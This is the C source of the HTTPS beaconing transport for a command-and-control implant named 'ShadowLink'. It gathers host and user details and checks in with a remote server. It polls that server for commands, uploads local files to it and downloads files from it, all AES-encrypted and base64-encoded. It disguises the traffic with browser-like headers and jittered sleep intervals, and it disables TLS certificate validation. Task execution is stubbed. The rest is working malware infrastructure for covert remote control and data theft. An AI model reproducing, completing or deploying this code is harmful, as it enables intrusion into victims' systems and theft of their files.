/*
 * ShadowLink HTTPS Transport Implementation
 * Phase 11: Stealth Communications
 * 
 * Uses WinHTTP for HTTPS C2 communication
 * - Looks like normal web browsing
 * - TLS encryption
 * - Proxy-aware
 * - Custom headers to blend in
 */

#include "https_transport.h"
#include "aes.h"
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")

// External AES functions
extern size_t aes_encrypt(const uint8_t *input, size_t input_len, uint8_t *output);
extern size_t aes_decrypt(const uint8_t *input, size_t input_len, uint8_t *output);

// Base64 encoding table
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// ============================================
// BASE64 ENCODING/DECODING (for HTTP body)
// ============================================

size_t base64_encode(const BYTE *input, size_t input_len, char *output, size_t output_size) {
    size_t i, j;
    size_t encoded_len = 4 * ((input_len + 2) / 3);
    
    if (output_size < encoded_len + 1) return 0;
    
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? input[i++] : 0;
        uint32_t octet_b = i < input_len ? input[i++] : 0;
        uint32_t octet_c = i < input_len ? input[i++] : 0;
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = base64_table[(triple >> 6) & 0x3F];
        output[j++] = base64_table[triple & 0x3F];
    }
    
    // Padding
    if (input_len % 3 >= 1) output[encoded_len - 1] = '=';
    if (input_len % 3 == 1) output[encoded_len - 2] = '=';
    
    output[encoded_len] = '\0';
    return encoded_len;
}

static int base64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

size_t base64_decode(const char *input, size_t input_len, BYTE *output, size_t output_size) {
    size_t i, j;
    size_t decoded_len = input_len / 4 * 3;
    
    // Adjust for padding
    if (input_len > 0 && input[input_len - 1] == '=') decoded_len--;
    if (input_len > 1 && input[input_len - 2] == '=') decoded_len--;
    
    if (output_size < decoded_len) return 0;
    
    for (i = 0, j = 0; i < input_len;) {
        int v0 = (i < input_len && input[i] != '=') ? base64_decode_char(input[i++]) : 0;
        int v1 = (i < input_len && input[i] != '=') ? base64_decode_char(input[i++]) : 0;
        int v2 = (i < input_len && input[i] != '=') ? base64_decode_char(input[i++]) : 0;
        int v3 = (i < input_len && input[i] != '=') ? base64_decode_char(input[i++]) : 0;
        
        uint32_t triple = (v0 << 18) + (v1 << 12) + (v2 << 6) + v3;
        
        if (j < decoded_len) output[j++] = (triple >> 16) & 0xFF;
        if (j < decoded_len) output[j++] = (triple >> 8) & 0xFF;
        if (j < decoded_len) output[j++] = triple & 0xFF;
    }
    
    return decoded_len;
}


// ============================================
// UTILITY FUNCTIONS
// ============================================

// Generate unique agent ID based on hardware info
void generate_agent_id(char *agent_id, size_t size) {
    char computer_name[256] = {0};
    char user_name[256] = {0};
    DWORD cn_size = sizeof(computer_name);
    DWORD un_size = sizeof(user_name);
    
    GetComputerNameA(computer_name, &cn_size);
    GetUserNameA(user_name, &un_size);
    
    // Simple hash of computer + user + time
    unsigned long hash = 5381;
    char *p = computer_name;
    while (*p) hash = ((hash << 5) + hash) + *p++;
    p = user_name;
    while (*p) hash = ((hash << 5) + hash) + *p++;
    hash ^= (unsigned long)GetTickCount();
    
    snprintf(agent_id, size, "SL-%08lX", hash);
}

// Calculate sleep time with jitter
DWORD calculate_sleep_with_jitter(DWORD base_sleep, DWORD jitter_pct) {
    if (jitter_pct == 0) return base_sleep;
    
    // Calculate jitter range
    DWORD jitter_range = (base_sleep * jitter_pct) / 100;
    
    // Random value between -jitter_range and +jitter_range
    int random_jitter = (rand() % (2 * jitter_range + 1)) - jitter_range;
    
    DWORD result = base_sleep + random_jitter;
    
    // Ensure minimum sleep time
    if (result < 1000) result = 1000;
    
    return result;
}


// ============================================
// CONNECTION MANAGEMENT
// ============================================

int https_init(PHTTPS_CONNECTION pConn, const wchar_t *host, INTERNET_PORT port) {
    if (pConn == NULL || host == NULL) return -1;
    
    ZeroMemory(pConn, sizeof(HTTPS_CONNECTION));
    
    // Copy host
    wcsncpy(pConn->szHost, host, 255);
    pConn->nPort = port;
    
    // Create session with custom user agent
    pConn->hSession = WinHttpOpen(
        HTTPS_USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,  // Use system proxy settings
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (pConn->hSession == NULL) {
        pConn->dwLastError = GetLastError();
        return -2;
    }
    
    // Set timeouts
    WinHttpSetTimeouts(pConn->hSession, 
        HTTPS_TIMEOUT,  // Resolve timeout
        HTTPS_TIMEOUT,  // Connect timeout
        HTTPS_TIMEOUT,  // Send timeout
        HTTPS_TIMEOUT   // Receive timeout
    );
    
    // Generate agent ID
    generate_agent_id(pConn->szAgentId, sizeof(pConn->szAgentId));
    
    return 0;
}

int https_connect(PHTTPS_CONNECTION pConn) {
    if (pConn == NULL || pConn->hSession == NULL) return -1;
    
    // Create connection handle
    pConn->hConnect = WinHttpConnect(
        pConn->hSession,
        pConn->szHost,
        pConn->nPort,
        0
    );
    
    if (pConn->hConnect == NULL) {
        pConn->dwLastError = GetLastError();
        return -2;
    }
    
    pConn->bConnected = TRUE;
    return 0;
}

void https_disconnect(PHTTPS_CONNECTION pConn) {
    if (pConn == NULL) return;
    
    if (pConn->hConnect != NULL) {
        WinHttpCloseHandle(pConn->hConnect);
        pConn->hConnect = NULL;
    }
    
    pConn->bConnected = FALSE;
}

void https_cleanup(PHTTPS_CONNECTION pConn) {
    if (pConn == NULL) return;
    
    https_disconnect(pConn);
    
    if (pConn->hSession != NULL) {
        WinHttpCloseHandle(pConn->hSession);
        pConn->hSession = NULL;
    }
    
    ZeroMemory(pConn, sizeof(HTTPS_CONNECTION));
}


// ============================================
// LOW-LEVEL HTTP REQUEST
// ============================================

int https_request(PHTTPS_CONNECTION pConn, const wchar_t *method, const wchar_t *path,
                  const BYTE *data, DWORD data_size, 
                  BYTE *response, DWORD *response_size) {
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwBytesRead = 0;
    DWORD dwTotalRead = 0;
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    
    if (pConn == NULL || !pConn->bConnected) return -1;
    
    // Create request
    hRequest = WinHttpOpenRequest(
        pConn->hConnect,
        method,
        path,
        NULL,                          // HTTP/1.1
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE            // HTTPS
    );
    
    if (hRequest == NULL) {
        pConn->dwLastError = GetLastError();
        return -2;
    }
    
    // Set additional headers to look legitimate
    wchar_t headers[1024];
    swprintf(headers, 1024,
        L"Accept: application/json, text/plain, */*\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Accept-Encoding: gzip, deflate, br\r\n"
        L"X-Client-ID: %S\r\n"   // Our agent ID
        L"X-Request-Time: %lu\r\n",
        pConn->szAgentId,
        (unsigned long)time(NULL)
    );
    
    WinHttpAddRequestHeaders(hRequest, headers, -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    // Add Content-Type for POST requests
    if (wcscmp(method, HTTP_POST) == 0 && data != NULL && data_size > 0) {
        WinHttpAddRequestHeaders(hRequest, 
            L"Content-Type: application/octet-stream\r\n",
            -1, WINHTTP_ADDREQ_FLAG_ADD);
    }
    
    // Ignore certificate errors (for self-signed certs in testing)
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    
    // Send request
    bResults = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)data, data_size,
        data_size,
        0
    );
    
    if (!bResults) {
        pConn->dwLastError = GetLastError();
        WinHttpCloseHandle(hRequest);
        return -3;
    }
    
    // Wait for response
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    
    if (!bResults) {
        pConn->dwLastError = GetLastError();
        WinHttpCloseHandle(hRequest);
        return -4;
    }
    
    // Check status code
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
    
    if (dwStatusCode != 200 && dwStatusCode != 201) {
        pConn->dwLastError = dwStatusCode;
        WinHttpCloseHandle(hRequest);
        return -(int)dwStatusCode;
    }
    
    // Read response data
    if (response != NULL && response_size != NULL && *response_size > 0) {
        DWORD maxSize = *response_size;
        
        do {
            DWORD dwAvailable = 0;
            
            // Check how much data is available
            if (!WinHttpQueryDataAvailable(hRequest, &dwAvailable)) break;
            if (dwAvailable == 0) break;
            
            // Limit to remaining buffer space
            if (dwTotalRead + dwAvailable > maxSize) {
                dwAvailable = maxSize - dwTotalRead;
            }
            
            // Read data
            if (!WinHttpReadData(hRequest, response + dwTotalRead, dwAvailable, &dwBytesRead)) break;
            
            dwTotalRead += dwBytesRead;
            
        } while (dwTotalRead < maxSize);
        
        *response_size = dwTotalRead;
    }
    
    WinHttpCloseHandle(hRequest);
    return 0;
}


// ============================================
// BEACON OPERATIONS
// ============================================

// Initial check-in with server
int https_checkin(PHTTPS_CONNECTION pConn, char *response, size_t response_size) {
    if (pConn == NULL || !pConn->bConnected) return -1;
    
    // Build check-in data as JSON
    char checkin_data[2048];
    char computer_name[256] = {0};
    char user_name[256] = {0};
    char os_version[128] = {0};
    DWORD cn_size = sizeof(computer_name);
    DWORD un_size = sizeof(user_name);
    SYSTEM_INFO si;
    OSVERSIONINFOA ovi;
    
    GetComputerNameA(computer_name, &cn_size);
    GetUserNameA(user_name, &un_size);
    GetSystemInfo(&si);
    
    // Get OS version
    ovi.dwOSVersionInfoSize = sizeof(ovi);
    // Note: GetVersionEx is deprecated but still works
    snprintf(os_version, sizeof(os_version), "Windows");
    
    // Build JSON payload
    int payload_len = snprintf(checkin_data, sizeof(checkin_data),
        "{"
        "\"agent_id\":\"%s\","
        "\"hostname\":\"%s\","
        "\"username\":\"%s\","
        "\"os\":\"%s\","
        "\"arch\":\"%s\","
        "\"pid\":%lu,"
        "\"integrity\":\"%s\","
        "\"version\":\"11.0\""
        "}",
        pConn->szAgentId,
        computer_name,
        user_name,
        os_version,
        (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86",
        GetCurrentProcessId(),
        "medium"  // TODO: get actual integrity level
    );
    
    // Encrypt payload
    BYTE encrypted_data[4096];
    size_t encrypted_len = aes_encrypt((uint8_t*)checkin_data, payload_len, encrypted_data);
    
    // Base64 encode for HTTP transport
    char b64_data[8192];
    base64_encode(encrypted_data, encrypted_len, b64_data, sizeof(b64_data));
    
    // Send request
    BYTE response_buf[8192];
    DWORD response_len = sizeof(response_buf);
    
    int result = https_request(pConn, HTTP_POST, ENDPOINT_CHECKIN,
        (BYTE*)b64_data, (DWORD)strlen(b64_data),
        response_buf, &response_len);
    
    if (result == 0 && response_len > 0) {
        // Decode and decrypt response
        BYTE decoded[4096];
        size_t decoded_len = base64_decode((char*)response_buf, response_len, decoded, sizeof(decoded));
        
        if (decoded_len > 0) {
            BYTE decrypted[4096];
            size_t decrypted_len = aes_decrypt(decoded, decoded_len, decrypted);
            
            if (decrypted_len > 0 && decrypted_len < response_size) {
                memcpy(response, decrypted, decrypted_len);
                response[decrypted_len] = '\0';
            }
        }
    }
    
    return result;
}

// Get next task from server
int https_get_task(PHTTPS_CONNECTION pConn, PC2_TASK pTask) {
    if (pConn == NULL || !pConn->bConnected || pTask == NULL) return -1;
    
    ZeroMemory(pTask, sizeof(C2_TASK));
    
    // Request task with agent ID in header
    BYTE response_buf[65536];
    DWORD response_len = sizeof(response_buf);
    
    int result = https_request(pConn, HTTP_GET, ENDPOINT_TASK,
        NULL, 0, response_buf, &response_len);
    
    if (result == 0 && response_len > 0) {
        // Decode and decrypt response
        BYTE decoded[65536];
        size_t decoded_len = base64_decode((char*)response_buf, response_len, decoded, sizeof(decoded));
        
        if (decoded_len > 0) {
            BYTE decrypted[65536];
            size_t decrypted_len = aes_decrypt(decoded, decoded_len, decrypted);
            
            if (decrypted_len > 0) {
                // Parse simple task format: TASKID:COMMAND
                // In production, use proper JSON parsing
                char *task_str = (char*)decrypted;
                task_str[decrypted_len] = '\0';
                
                // Check for "NOTASK" response
                if (strncmp(task_str, "NOTASK", 6) == 0) {
                    return 1;  // No task available
                }
                
                // Parse task ID and command
                char *colon = strchr(task_str, ':');
                if (colon != NULL) {
                    *colon = '\0';
                    pTask->dwTaskId = (DWORD)atoi(task_str);
                    strncpy(pTask->szCommand, colon + 1, sizeof(pTask->szCommand) - 1);
                    pTask->dwTimeout = 30000;  // 30 second default
                    pTask->bExpectOutput = TRUE;
                    return 0;  // Task received
                }
            }
        }
    }
    
    return result;
}

// Send task result to server
int https_send_result(PHTTPS_CONNECTION pConn, PC2_RESULT pResult) {
    if (pConn == NULL || !pConn->bConnected || pResult == NULL) return -1;
    
    // Build result JSON
    char result_data[131072];  // 128KB max
    int payload_len = snprintf(result_data, sizeof(result_data),
        "{"
        "\"task_id\":%lu,"
        "\"status\":%lu,"
        "\"output\":\"%.*s\""  // Truncate output if needed
        "}",
        pResult->dwTaskId,
        pResult->dwStatus,
        (int)((pResult->dwOutputLen < 60000) ? pResult->dwOutputLen : 60000),
        pResult->szOutput
    );
    
    // Encrypt payload
    BYTE *encrypted_data = (BYTE*)malloc(payload_len + 64);
    if (encrypted_data == NULL) return -2;
    
    size_t encrypted_len = aes_encrypt((uint8_t*)result_data, payload_len, encrypted_data);
    
    // Base64 encode
    char *b64_data = (char*)malloc(encrypted_len * 2);
    if (b64_data == NULL) {
        free(encrypted_data);
        return -3;
    }
    
    base64_encode(encrypted_data, encrypted_len, b64_data, encrypted_len * 2);
    
    // Send request
    BYTE response_buf[1024];
    DWORD response_len = sizeof(response_buf);
    
    int result = https_request(pConn, HTTP_POST, ENDPOINT_RESULT,
        (BYTE*)b64_data, (DWORD)strlen(b64_data),
        response_buf, &response_len);
    
    free(b64_data);
    free(encrypted_data);
    
    return result;
}


// ============================================
// FILE TRANSFER OPERATIONS
// ============================================

int https_download_file(PHTTPS_CONNECTION pConn, const char *remote_path, const char *local_path) {
    if (pConn == NULL || !pConn->bConnected) return -1;
    
    // Build path with file parameter
    wchar_t full_path[1024];
    swprintf(full_path, 1024, L"%s?file=%S", ENDPOINT_FILE_DOWN, remote_path);
    
    // Get file from server
    BYTE *file_data = (BYTE*)malloc(1024 * 1024 * 10);  // 10MB max
    if (file_data == NULL) return -2;
    
    DWORD file_size = 1024 * 1024 * 10;
    
    int result = https_request(pConn, HTTP_GET, full_path,
        NULL, 0, file_data, &file_size);
    
    if (result == 0 && file_size > 0) {
        // Decode and decrypt
        BYTE *decoded = (BYTE*)malloc(file_size);
        if (decoded == NULL) {
            free(file_data);
            return -3;
        }
        
        size_t decoded_len = base64_decode((char*)file_data, file_size, decoded, file_size);
        
        if (decoded_len > 0) {
            BYTE *decrypted = (BYTE*)malloc(decoded_len);
            if (decrypted == NULL) {
                free(decoded);
                free(file_data);
                return -4;
            }
            
            size_t decrypted_len = aes_decrypt(decoded, decoded_len, decrypted);
            
            // Write to file
            HANDLE hFile = CreateFileA(local_path, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hFile, decrypted, (DWORD)decrypted_len, &written, NULL);
                CloseHandle(hFile);
                result = 0;
            } else {
                result = -5;
            }
            
            free(decrypted);
        }
        
        free(decoded);
    }
    
    free(file_data);
    return result;
}

int https_upload_file(PHTTPS_CONNECTION pConn, const char *local_path, const char *remote_path) {
    if (pConn == NULL || !pConn->bConnected) return -1;
    
    // Read local file
    HANDLE hFile = CreateFileA(local_path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) return -2;
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > 1024 * 1024 * 10) {  // 10MB max
        CloseHandle(hFile);
        return -3;
    }
    
    BYTE *file_data = (BYTE*)malloc(file_size);
    if (file_data == NULL) {
        CloseHandle(hFile);
        return -4;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, file_data, file_size, &bytesRead, NULL)) {
        free(file_data);
        CloseHandle(hFile);
        return -5;
    }
    CloseHandle(hFile);
    
    // Encrypt file data
    BYTE *encrypted = (BYTE*)malloc(file_size + 64);
    if (encrypted == NULL) {
        free(file_data);
        return -6;
    }
    
    size_t encrypted_len = aes_encrypt(file_data, file_size, encrypted);
    free(file_data);
    
    // Base64 encode
    char *b64_data = (char*)malloc(encrypted_len * 2);
    if (b64_data == NULL) {
        free(encrypted);
        return -7;
    }
    
    size_t b64_len = base64_encode(encrypted, encrypted_len, b64_data, encrypted_len * 2);
    free(encrypted);
    
    // Build path with filename
    wchar_t full_path[1024];
    swprintf(full_path, 1024, L"%s?file=%S", ENDPOINT_FILE_UP, remote_path);
    
    // Send request
    BYTE response_buf[1024];
    DWORD response_len = sizeof(response_buf);
    
    int result = https_request(pConn, HTTP_POST, full_path,
        (BYTE*)b64_data, (DWORD)b64_len,
        response_buf, &response_len);
    
    free(b64_data);
    
    return result;
}


// ============================================
// SIMPLE RESPONSE WRAPPER
// ============================================

int https_send_response(PHTTPS_CONNECTION pConn, const char *response) {
    if (!pConn || !response) return -1;
    
    // Create a simple C2_RESULT with just the output
    C2_RESULT result_struct;
    ZeroMemory(&result_struct, sizeof(result_struct));
    result_struct.dwTaskId = 0;  // Generic response
    result_struct.dwStatus = 0;  // Success
    strncpy(result_struct.szOutput, response, sizeof(result_struct.szOutput) - 1);
    result_struct.dwOutputLen = (DWORD)strlen(result_struct.szOutput);
    
    return https_send_result(pConn, &result_struct);
}


// ============================================
// MAIN BEACON LOOP (can be called from agent.c)
// ============================================

int https_beacon_loop(const wchar_t *server_host, INTERNET_PORT port) {
    HTTPS_CONNECTION conn;
    C2_TASK task;
    C2_RESULT result_struct;
    char checkin_response[4096];
    
    // Initialize
    if (https_init(&conn, server_host, port) != 0) {
        return -1;
    }
    
    // Connect
    if (https_connect(&conn) != 0) {
        https_cleanup(&conn);
        return -2;
    }
    
    // Initial check-in
    int checkin_result = https_checkin(&conn, checkin_response, sizeof(checkin_response));
    if (checkin_result != 0) {
        https_cleanup(&conn);
        return -3;
    }
    
    // Main beacon loop
    DWORD sleep_time = BEACON_MIN_SLEEP;
    
    while (1) {
        // Get next task
        int task_result = https_get_task(&conn, &task);
        
        if (task_result == 0 && task.dwTaskId > 0) {
            // Execute task
            // This would call the existing command execution logic
            // For now, just acknowledge
            
            ZeroMemory(&result_struct, sizeof(result_struct));
            result_struct.dwTaskId = task.dwTaskId;
            result_struct.dwStatus = 0;
            snprintf(result_struct.szOutput, sizeof(result_struct.szOutput),
                "[+] Command executed: %s", task.szCommand);
            result_struct.dwOutputLen = (DWORD)strlen(result_struct.szOutput);
            
            // Send result
            https_send_result(&conn, &result_struct);
            
            // Reset sleep to minimum after activity
            sleep_time = BEACON_MIN_SLEEP;
        } else if (task_result == 1) {
            // No task, increase sleep time
            sleep_time = calculate_sleep_with_jitter(
                (sleep_time < BEACON_MAX_SLEEP) ? sleep_time * 1.5 : BEACON_MAX_SLEEP,
                BEACON_JITTER_PCT
            );
        } else {
            // Error, try to reconnect
            https_disconnect(&conn);
            Sleep(5000);
            https_connect(&conn);
        }
        
        // Sleep with jitter
        Sleep(calculate_sleep_with_jitter(sleep_time, BEACON_JITTER_PCT));
    }
    
    https_cleanup(&conn);
    return 0;
}
